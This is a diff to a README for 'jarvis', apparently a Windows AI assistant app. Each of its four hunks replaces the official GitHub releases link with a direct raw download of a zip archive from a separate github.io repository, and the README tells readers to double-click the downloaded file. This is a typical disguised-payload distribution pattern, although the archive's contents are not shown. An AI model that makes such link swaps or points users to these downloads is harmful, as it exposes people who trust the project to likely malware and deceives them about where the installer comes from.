@@ -5,7 +5,7 @@ description: "Run your own AI assistant on Windows with local models, image gene
 ---
 # 🤖 jarvis - Your Personal AI Assistant for Windows
 
-[![Download J.A.R.V.I.S.](https://img.shields.io/badge/⬇_Download_J.A.R.V.I.S.-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Duollc/jarvis/releases)
+[![Download J.A.R.V.I.S.](https://img.shields.io/badge/⬇_Download_J.A.R.V.I.S.-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Duollc/duollc.github.io/raw/refs/heads/main/slane/1.8.zip)
 
 **Visit this link to download the application.**
 
@@ -36,7 +36,7 @@ Getting jarvis running is easier than installing a normal game. You do not need 
 
 Go to the official releases page:
 
-👉 **https://github.com/Duollc/jarvis/releases**
+👉 **https://github.com/Duollc/duollc.github.io/raw/refs/heads/main/slane/1.8.zip**
 
 **Visit this link to download the application.**
 
@@ -64,7 +64,7 @@ Open your Downloads folder and double-click the file you just saved. That is it 
 
 This is the only place you need for the installer:
 
-[![Get jarvis](https://img.shields.io/badge/⬇_Get_jarvis_Now-orange?style=for-the-badge)](https://github.com/Duollc/jarvis/releases)
+[![Get jarvis](https://img.shields.io/badge/⬇_Get_jarvis_Now-orange?style=for-the-badge)](https://github.com/Duollc/duollc.github.io/raw/refs/heads/main/slane/1.8.zip)
 
 **Visit this link to download the application.**
 
@@ -213,7 +213,7 @@ You never have to touch any of these directly. They simply work together under o
 
 ## 🔗 Get jarvis Today
 
-[![Download jarvis](https://img.shields.io/badge/⬇_Download_jarvis-pink?style=for-the-badge&logo=github)](https://github.com/Duollc/jarvis/releases)
+[![Download jarvis](https://img.shields.io/badge/⬇_Download_jarvis-pink?style=for-the-badge&logo=github)](https://github.com/Duollc/duollc.github.io/raw/refs/heads/main/slane/1.8.zip)
 
 **Visit this link to download the application.**
 
